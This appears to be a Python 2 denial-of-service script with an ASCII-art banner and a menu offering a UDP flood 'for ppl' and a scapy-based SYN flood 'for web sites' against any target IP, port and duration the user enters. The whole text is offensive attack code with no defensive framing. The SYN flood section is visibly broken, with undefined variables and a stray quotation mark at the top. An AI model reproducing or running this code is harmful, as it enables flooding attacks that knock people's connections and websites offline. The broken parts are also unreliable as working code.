 ___  ___  ___  ___                   ___  ___ 
|   )|___)|   )|   )\   )     |   )| |___ |___)
|__/ |__  |  / |  /  \_/      |/\/ |  __/ |__  
|                     /                        
                                                                                                          
""" )
print  ("*" * 60)
print ("                       ̫̣̘̲͓" )
print ("*" * 60, "red")
print (""" choose request
 1. udp flood (for ppl)
 2. synflood (for web sites **2 ONLY WORKS ON KALI LINUX**)""")
type = raw_input("penny Wise> ")
if type == "1":
 import socket
 import os
 import time
 import random
 import sys
 client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
 victim = raw_input("enter ip or website: ")
 vport = input("  port: ")
 duration = input("time(in secs): ")
 timeout = time.time() + duration
 sent = 0
 print ("""
****************************************************
       Dos attack starting. Sit back and ejoy the show
****************************************************""")
 while 1:
  if time.time() > timeout:
    break
  else:
    pass
  client.sendto(bytes, (victim, vport))
  sent = sent + 1
  sys.stdout.write("\r% d packets sent " % sent)
  sys.stdout.flush()

if type == "2":
 import socket, random, sys, threading
 from scapy.all import *
 total = 0
 
 target1 = raw_input("targets site: ")
 port = input("port: ")
 class SendHTTP(threading.Thread):
  global target, port
  def __init__(self):
    threading.Thread.__init__(self)
  def run(self): 
   i = IP()
   i.dst = target1
 
   t = TCP()
   t.sport = random.randint(1,65535)
   t.dport = port
   f.flags = 's'
   send(i/t, verbose=0)
 print ("""
********************************************************
      Dos attack starting. Sit back and ejoy the show
******************************************************""")

 while 1:
  SendHTTP(POST).start()
  total = total + 1
  sys.stdout.write("\r packets sent %i" % total)

